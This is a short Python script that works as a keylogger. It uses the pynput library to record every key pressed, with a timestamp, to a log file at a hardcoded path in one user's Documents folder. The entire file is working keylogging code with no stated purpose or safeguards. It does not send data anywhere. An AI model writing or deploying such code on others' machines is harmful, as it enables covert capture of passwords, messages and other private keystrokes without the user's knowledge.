from pynput.keyboard import Key, Listener
import logging



log_dir = ""
logging.basicConfig(filename=(log_dir + "/Users/park-yeojun/Documents/keyLog_txt/keyLogger.rtf"),
                    level=logging.DEBUG, format='["%(asctime)s",%(message)s]')

def on_press(key):
    logging.info('"{0}"'.format(key))

with Listener(on_press=on_press) as listener:
    listener.join()


    

